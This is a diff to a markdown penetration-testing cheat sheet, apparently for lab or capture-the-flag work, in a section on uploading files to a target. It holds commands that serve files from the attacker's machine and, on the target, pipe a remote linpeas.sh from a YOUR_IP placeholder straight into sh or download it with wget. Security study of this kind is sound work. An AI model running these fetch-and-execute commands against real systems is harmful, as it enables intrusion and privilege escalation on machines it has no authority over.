@@ -38,10 +38,14 @@ fg
 > press `Enter`
 
 ## Uploading files
+- On your machine
 ```
 python -m http.server 8000
 ```
-example
+- Download examples on target
 ```
 curl -L YOUR_IP:8000/linpeas.sh | sh
+```
+```
+wget YOUR_IP:8000/linpeas.sh -O linpeas.sh
 ```
